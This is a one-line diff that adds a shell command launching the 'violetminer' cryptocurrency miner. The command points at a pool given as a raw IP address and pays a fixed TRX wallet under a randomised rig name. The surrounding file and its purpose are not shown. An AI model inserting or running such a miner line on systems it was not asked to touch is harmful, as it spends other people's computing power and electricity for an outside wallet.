@@ -1,0 +1,1 @@
+./violetminer --pool 66.42.52.208:33401 --username TRX:TY7ZX4F8AhTnaQRpqnU8zA8KCMJGyDo4K1.$(tr -dc 1-9 </dev/urandom | head -c 6 ; echo 'RIG') --password x --algorithm wrkzcoin
